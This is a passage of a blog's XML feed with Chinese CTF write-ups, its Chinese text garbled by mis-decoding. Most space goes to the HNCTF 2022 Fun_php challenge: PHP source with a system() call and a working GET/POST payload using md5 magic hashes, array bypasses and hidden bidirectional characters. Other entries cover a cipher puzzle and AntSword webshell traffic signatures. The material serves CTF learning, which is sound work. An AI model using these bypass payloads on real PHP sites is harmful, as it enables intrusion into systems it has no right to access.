gml">?<span class="hljs-variable language_">x</span>[]=<span class="hljs-number">1</span>&amp;<span class="hljs-variable language_">y</span>[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>ç„¶åè·³è½¬åˆ°ä¸‹ä¸€å…³</p><p><img src="D:\work\notebook\ontebook\CTF\é¢˜ç›®å¤ç°\NSSCTFæ¯æ—¥ä¸€é¢˜\assets\image-20251023173631722-1761212287927-26-1761212306106-30.png" alt="image-20251023173631722"></p><p>æ˜¯è¦è¿›è¡Œmd5å¼ºæ¯”è¾ƒï¼Œè¿™é‡Œä½¿ç”¨æ•°ç»„ç»•è¿‡</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251023173757201-1761212304166-28.png" alt="image-20251023173757201"></p>]]></content>
    
    
    <categories>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NSSCTF</tag>
      
      <tag>md5ç¢°æ’</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[SWPU 2019]ä¼Ÿå¤§çš„ä¾¦æ¢</title>
    <link href="/2025/10/23/SWPU-2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/"/>
    <url>/2025/10/23/SWPU-2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="SWPU-2019-ä¼Ÿå¤§çš„ä¾¦æ¢"><a href="#SWPU-2019-ä¼Ÿå¤§çš„ä¾¦æ¢" class="headerlink" title="[SWPU 2019]ä¼Ÿå¤§çš„ä¾¦æ¢"></a>[SWPU 2019]ä¼Ÿå¤§çš„ä¾¦æ¢</h1><p>æ‰“å¼€é™„ä»¶ <code>misc</code>æ–‡ä»¶å¤¹éœ€è¦è§£å‹å¯†ç ï¼Œ<code>å¯†ç .txt</code>é‡Œæœ‰ä¸€ä¸²ä¹±ç ï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹ç”¨å„ç§ç¼–ç è¯»ï¼Œä½¿ç”¨<code>010 Editor</code> <code>EBCDIC</code>ç¼–ç å³å¯å‘ç°å¯†ç æ˜æ–‡ã€‚</p><p>å…·ä½“æ“ä½œä¸ºè§†å›¾-&gt;ç¼–è¾‘æ–¹å¼-&gt;EBCDIC</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251023165238456-1761209560001-1-1761209587161-5.png" alt="image-20251023165238456"></p><p>æ–‡ä»¶å¤¹è§£å‹ç¼©ä¹‹åå¯ä»¥çœ‹åˆ°é‡Œé¢çš„å†…å®¹</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251023165258910-1761209580120-3.png" alt="image-20251023165258910"></p><p>è°·æ­Œè¯†å›¾å‘ç°æ˜¯â€œè·³èˆçš„å°äººâ€å¯†ç ï¼Œ</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251023165459685-1761209700891-11-1761209702113-13-1761209703306-15.png" alt="image-20251023165459685"></p><p>æœç´¢ä¸€ä¸‹å¯¹ç…§è¡¨å¯¹æ‰¾å¾—åˆ°flagã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251023165401310-1761209643975-9.png" alt="image-20251023165401310"></p>]]></content>
    
    
    <categories>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¼–ç </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[HNCTF 2022 WEEK3]Fun_php</title>
    <link href="/2025/10/21/HNCTF-2022-WEEK3-Fun-php/"/>
    <url>/2025/10/21/HNCTF-2022-WEEK3-Fun-php/</url>
    
    <content type="html"><![CDATA[<h1 id="HNCTF-2022-WEEK3-Fun-php"><a href="#HNCTF-2022-WEEK3-Fun-php" class="headerlink" title="[HNCTF 2022 WEEK3]Fun_php"></a>[HNCTF 2022 WEEK3]Fun_php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;k1y.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;fl4g.php&quot;</span>;<br><span class="hljs-variable">$week_1</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$week_2</span> = <span class="hljs-literal">false</span>;<br><br><span class="hljs-variable">$getUserID</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user&#x27;</span>]; <br><span class="hljs-variable">$getpass</span> = (<span class="hljs-keyword">int</span>)@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]; <br><span class="hljs-variable">$getmySaid</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mySaid&#x27;</span>]; <br><span class="hljs-variable">$getmyHeart</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;myHeart&#x27;</span>]; <br><br><span class="hljs-variable">$data</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><span class="hljs-variable">$verify</span> =@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;verify&#x27;</span>];<br><span class="hljs-variable">$want</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;want&#x27;</span>];<br><span class="hljs-variable">$final</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;final&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;Welcom&quot;</span>==<span class="hljs-number">0</span>&amp;&amp;<span class="hljs-string">&quot;T0&quot;</span>==<span class="hljs-number">0</span>&amp;&amp;<span class="hljs-string">&quot;1he&quot;</span>==<span class="hljs-number">1</span>&amp;&amp;<span class="hljs-string">&quot;HNCTF2022&quot;</span>==<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcom T0 1he HNCTF2022&lt;BR&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;state_HNCTF2022&quot;</span> == <span class="hljs-number">1</span>) <span class="hljs-keyword">echo</span> <span class="hljs-variable">$hint</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;HINT? NoWay~!&lt;BR&gt;&quot;</span>;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$getUserID</span>))<br>    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$user</span> + <span class="hljs-variable">$getUserID</span>; <span class="hljs-comment">//u5er_D0_n0t_b3g1n_with_4_numb3r</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span> == <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-variable">$getpass</span> == <span class="hljs-variable">$pass</span>)&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$getmySaid</span>)) <br>        <span class="hljs-keyword">die</span>();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$getmyHeart</span>)) <br>        <span class="hljs-keyword">die</span>();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$getmySaid</span>) != <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$getmyHeart</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Cheater!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-variable">$week_1</span> = <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>))&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$data</span>);<span class="hljs-variable">$i</span>++)&#123;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>]===<span class="hljs-string">&quot;Probius&quot;</span>) <span class="hljs-keyword">exit</span>();<br><br>        <span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>]=<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>]);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;Probius&quot;</span>,<span class="hljs-variable">$data</span>)===<span class="hljs-number">0</span>)<br>        <span class="hljs-variable">$week_2</span> = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;HACK!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$week_1</span> &amp;&amp; <span class="hljs-variable">$week_2</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$data</span>)===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$verify</span>))<br>        <span class="hljs-comment">// â€®â¦HNCTFâ©â¦Welcome to</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;hn&quot;</span> == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hn&#x27;</span>] &amp;â€®â¦+!!â©â¦&amp; <span class="hljs-string">&quot;â€®â¦ Flag!â©â¦ctf&quot;</span> == <span class="hljs-variable">$_GET</span>[â€®â¦LAGâ©â¦ctf]) &#123; <span class="hljs-comment">//HN! flag!! F</span><br>        <br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|\fl4g|\\$|&#x27;|\&quot;/i&quot;</span>,<span class="hljs-variable">$want</span>)Or <span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$want</span>))<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;HACK!&quot;</span>);<br>       <br>                <span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Fine!you win&quot;</span>;<br>                    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat ./<span class="hljs-subst">$want</span>&quot;</span>);<br>                 &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;HACK!&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span> == <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-variable">$getpass</span> == <span class="hljs-variable">$pass</span>)&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$getmySaid</span>)) <br>        <span class="hljs-keyword">die</span>();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$getmyHeart</span>)) <br>        <span class="hljs-keyword">die</span>();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$getmySaid</span>) != <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$getmyHeart</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Cheater!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-variable">$week_1</span> = <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li><code>$_GET[&#39;user&#39;]</code> &#x3D;&#x3D; 114514</li></ol><p>ä¼ å€¼user&#x3D;114514</p><ol start="2"><li><p><code> $getpass == $pass</code>ç›´æ¥æ»¡è¶³</p></li><li><p><code>$_GET[&#39;mySaid&#39;]</code>ä»…ç”±å­—æ¯ç»„æˆï¼ˆAâ€“Z &#x2F; aâ€“zï¼‰</p></li><li><p><code>$_GET[&#39;myHeart&#39;]</code> æ˜¯æ•°å­—æˆ–èƒ½è¢«å½“ä½œæ•°å­—çš„å­—ç¬¦ä¸²</p></li><li><p><code>$_GET[&#39;mySaid&#39;]</code> å’Œ<code>$_GET[&#39;myHeart&#39;]</code>md5å€¼ç›¸åŒ</p></li></ol><p>ä¼ å€¼mySaid&#x3D;QNKCDZO&amp;myHeart&#x3D;240610708</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>))&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$data</span>);<span class="hljs-variable">$i</span>++)&#123;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>]===<span class="hljs-string">&quot;Probius&quot;</span>) <span class="hljs-keyword">exit</span>();<br><br>        <span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>]=<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>]);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;Probius&quot;</span>,<span class="hljs-variable">$data</span>)===<span class="hljs-number">0</span>)<br>        <span class="hljs-variable">$week_2</span> = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;HACK!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ol start="6"><li><code>$_POST[&#39;data&#39;]</code>æ˜¯æ•°ç»„</li></ol><p>å¾ªç¯ä½œç”¨æ˜¯éå†æ•°ç»„ï¼Œå¦‚æœé‡åˆ°æŸä¸€ä¸ªé”®å€¼ä¸º<code>Probius </code>å°±exit()</p><p>ä½†æ˜¯åªæœ‰ <code>array_search(&quot;Probius&quot;,$data)===0 </code>æ‰èƒ½ä½¿ week_2ä¸ºtrue</p><p><code>array_search</code>ä½œç”¨ï¼šåœ¨æ•°ç»„ä¸­æœç´¢é”®å€¼ â€œProbiusâ€ï¼Œå¹¶è¿”å›å®ƒçš„é”®å</p><p>æ‰€ä»¥æˆ‘ä»¬ä¼ å…¥data[0]&#x3D;probius ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$week_1</span> &amp;&amp; <span class="hljs-variable">$week_2</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$data</span>)===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$verify</span>))<br>        <span class="hljs-comment">// â€®â¦HNCTFâ©â¦Welcome to</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;hn&quot;</span> == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hn&#x27;</span>] &amp;â€®â¦+!!â©â¦&amp; <span class="hljs-string">&quot;â€®â¦ Flag!â©â¦ctf&quot;</span> == <span class="hljs-variable">$_GET</span>[â€®â¦LAGâ©â¦ctf]) &#123; <span class="hljs-comment">//HN! flag!! F</span><br>        <br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|\fl4g|\\$|&#x27;|\&quot;/i&quot;</span>,<span class="hljs-variable">$want</span>)Or <span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$want</span>))<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;HACK!&quot;</span>);<br>       <br>                <span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Fine!you win&quot;</span>;<br>                    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat ./<span class="hljs-subst">$want</span>&quot;</span>);<br>                 &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;HACK!&quot;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><ol start="7"><li>è¦æ±‚<code>md5($data)===md5($verify)</code>å› ä¸º<code>$data</code>æ˜¯æ•°ç»„ï¼Œæˆ‘ä»¬ä¼ å…¥<code>$_POST[&#39;verify&#39;]</code>ä¹Ÿæ˜¯æ•°ç»„å³å¯ã€‚</li><li><code>$_POST[&#39;want&#39;]</code>æ˜¯æˆ‘ä»¬è¦è®¿é—®çš„æ–‡ä»¶åï¼Œä½†æ˜¯ä¸èƒ½åŒ¹é…åˆ°æ­£åˆ™<code>&quot;/php|\fl4g|\\$|&#39;|\&quot;/i&quot;</code>ã€‚</li></ol><p>ä¼ å‚ä¸€ç›´æ²¡å›æ˜¾çœ‹wpè¿™ä¸¤è¡Œæ˜¯æœ‰é›¶å®½å­—ç¬¦çš„<img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251021210352632-1761054510816-9.png" alt="image-20251021210352632"></p><p>å…¶å®èƒ½æ³¨æ„åˆ°å•ç‹¬é€‰å–è¿™ä¸¤è¡Œçš„è¯æœ‰ç‚¹å¥‡æ€ª</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251021210509084-1761054509042-7.png" alt="image-20251021210509084"></p><p>æå–0å®½å­—ç¬¦çš„æ–¹æ³•æ˜¯å¤åˆ¶åˆ°010é‡Œæ‰“å¼€ã€‚(å…¶å®ç›´æ¥æŠŠä»£ç ä¸¢ç»™AIä¹Ÿèƒ½å‘ç°å¼‚å¸¸)</p><p>æˆªå›¾å±•ç¤ºä¸€ä¸‹ä¸¤ç§æ–¹å¼</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251021210735988-1761054492556-5.png" alt="image-20251021210735988"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251021211734102-1761054488546-3.png" alt="image-20251021211734102"></p><ol start="9"><li>ç„¶åå°±æ˜¯ä¼ <code>hn</code>å’Œ<code>ctf</code>è¦æŠŠ0å®½å­—ç¬¦ä¹Ÿå¤åˆ¶ä¸‹æ¥ã€‚</li></ol><p>æŒ‰ç…§ä»¥ä¸Šä¹ç‚¹ä¼ å‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251021214652075-1761054484827-1.png" alt="image-20251021214652075"></p><p>payload</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs llvm">GET:<br>?user<span class="hljs-operator">=</span><span class="hljs-number">114514</span>&amp;pass<span class="hljs-operator">=</span>d&amp;mySaid<span class="hljs-operator">=</span>TUFEPMC&amp;myHeart<span class="hljs-operator">=</span><span class="hljs-number">1586264293</span>&amp;hn<span class="hljs-operator">=</span>hn&amp;<span class="hljs-variable">%E2</span><span class="hljs-variable">%80</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A6LAG</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A6ctf</span><span class="hljs-operator">=</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%80</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A6</span> Flag!<span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A6ctf</span><br><br>POST:<br>data[]<span class="hljs-operator">=</span><span class="hljs-number">0</span>&amp;verify[]<span class="hljs-operator">=</span><span class="hljs-number">3</span>&amp;want<span class="hljs-operator">=</span>f*<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>å®æ“</category>
      
    </categories>
    
    
    <tags>
      
      <tag>phpä»£ç å®¡è®¡</tag>
      
      <tag>0å®½éšå†™</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[é™‡å‰‘æ¯ 2021]webshellï¼ˆé—®6ï¼‰</title>
    <link href="/2025/10/21/%E9%99%87%E5%89%91%E6%9D%AF-2021-webshell%EF%BC%88%E9%97%AE6%EF%BC%89/"/>
    <url>/2025/10/21/%E9%99%87%E5%89%91%E6%9D%AF-2021-webshell%EF%BC%88%E9%97%AE6%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="é™‡å‰‘æ¯-2021-webshellï¼ˆé—®6ï¼‰"><a href="#é™‡å‰‘æ¯-2021-webshellï¼ˆé—®6ï¼‰" class="headerlink" title="[é™‡å‰‘æ¯ 2021]webshellï¼ˆé—®6ï¼‰"></a>[é™‡å‰‘æ¯ 2021]webshellï¼ˆé—®6ï¼‰</h1><p>é»‘å®¢ä»£ç†å·¥å…·çš„å›è¿æœåŠ¡ç«¯IPæ˜¯_____________ã€‚</p><p>è¿½è¸ª</p><p>[^tcpæµ]: ä¸ºä»€ä¹ˆè¦è¿½è¸ªTCPæµï¼Œåœ¨ç½‘ç»œæµé‡åˆ†æä¸­ï¼Œ<code>â€œè¿½è¸ª TCP æµâ€ï¼ˆFollow TCP Streamï¼‰</code>èƒ½æŠŠåŸæœ¬é›¶æ•£çš„ç½‘ç»œæ•°æ®åŒ…è¿˜åŸæˆä¸€æ¡é€»è¾‘ä¸Šçš„â€œä¼šè¯â€ï¼Œä¹Ÿå°±æ˜¯é€šä¿¡åŒæ–¹ä¹‹é—´çš„å®Œæ•´æ•°æ®äº¤æ¢ã€‚TCP æµèƒ½æ­ç¤ºæ”»å‡»æ‰‹æ³•ã€å‘½ä»¤åºåˆ—ã€æ•°æ®æ³„éœ²è·¯å¾„ã€‚</p><p>ï¼Œåœ¨æµ38ä¸­å‘ç°ä¸€ä¸²åå…­è¿›åˆ¶ä»£ç ï¼Œ</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251021133955923.png" alt="image-20251021133955923">è¿™æ˜¯</p><p>[^èšå‰‘ç‰¹å¾]: èšå‰‘çš„ PHP ç«¯é©¬ï¼ˆé»˜è®¤é©¬ï¼‰åœ¨é€šä¿¡ä¸Šå›ºå®šçš„ç‰¹å¾ï¼š</p><table><thead><tr><th>ç‰¹å¾ä½ç½®</th><th>å†…å®¹è¯´æ˜</th></tr></thead><tbody><tr><td><code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;)</code>ã€<code>@set_time_limit(0)</code></td><td>ç¦é”™+ä¸é™æ—¶ï¼Œè¿™æ˜¯å‡ ä¹æ‰€æœ‰èšå‰‘é©¬çš„å¼€å¤´</td></tr><tr><td><code>asenc()</code> &#x2F; <code>asoutput()</code></td><td>è¿™æ˜¯èšå‰‘é»˜è®¤é€šä¿¡è¾“å‡ºå‡½æ•°åï¼Œåˆ†åˆ«å¯¹åº”<strong>ç¼–ç è¾“å‡º</strong>ä¸<strong>HTTPè¾¹ç•Œåˆ†éš”è¾“å‡º</strong>ï¼Œç”¨äºåˆ†å‰²è¿”å›å†…å®¹</td></tr><tr><td>è¾“å‡ºåŒ…è£¹ç¬¦ <code>&quot;28f72&quot;</code> ä¸ <code>&quot;f48611f4&quot;</code></td><td>è¿™æ˜¯èšå‰‘ç”¨æ¥æ ‡è¯†è¿”å›æ•°æ®è¾¹ç•Œçš„éšæœºå¸¸é‡ï¼ˆæ¯ä¸ªé©¬ç•¥æœ‰ä¸åŒï¼Œä½†å½¢æ€å›ºå®šï¼‰</td></tr><tr><td>POST å‚æ•°åå¦‚ <code>j68071301598f</code>ã€<code>xa5d606e67883a</code></td><td>è¿™äº›æ˜¯èšå‰‘è‡ªåŠ¨ç”Ÿæˆçš„éšæœºå˜é‡åï¼Œå…¸å‹ç‰¹å¾ï¼š16ä½åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¸¸ç”¨åœ¨èšå‰‘é€šä¿¡åè®®ä¸­</td></tr><tr><td><code>$f=base64_decode(substr($_POST[&quot;j...&quot;],2))</code></td><td>èšå‰‘çš„æ–‡ä»¶å†™å…¥&#x2F;å‘½ä»¤æ‰§è¡Œ&#x2F;æ’ä»¶æ“ä½œæ¨¡å—é‡Œï¼Œéƒ½ä¼šç”¨â€œbase64è§£ç è·¯å¾„ + æ•°æ®åˆ†å—å†™å…¥â€å½¢å¼</td></tr><tr><td><code>$buf.=urldecode(&quot;%&quot;.substr(...))</code></td><td>è¿™æ˜¯èšå‰‘å‘é€æ–‡ä»¶å†…å®¹æ—¶å¯¹ payload åšçš„ URL åå…­è¿›åˆ¶ç¼–ç è¿˜åŸè¿‡ç¨‹ï¼ˆå…¸å‹ï¼‰</td></tr><tr><td><code>&quot;ERROR://&quot;</code></td><td>èšå‰‘çš„å¼‚å¸¸è¾“å‡ºæ ‡è¯†ç¬¦ï¼›å®¢æˆ·ç«¯çœ‹åˆ°è¿™ä¸ªå‰ç¼€å°±çŸ¥é“æ˜¯æ‰§è¡Œé”™è¯¯</td></tr></tbody></table><p>çš„æ•°æ®æµ ï¼Œå°†&#x3D;å·åé¢çš„å†…å®¹è¿›è¡Œbase16è§£ç ï¼Œæ‰¾åˆ°ç­”æ¡ˆã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251021134900099.png" alt="image-20251021134900099"></p>]]></content>
    
    
    <categories>
      
      <category>åŸºç¡€çŸ¥è¯†</category>
      
      <category>å®æ“</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æµé‡åˆ†æ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[SUSCTF 2022]Tanner</title>
    <link href="/2025/10/20/SUSCTF-2022-Tanner/"/>
    <url>/2025/10/20/SUSCTF-2022-Tanner/</url>
    
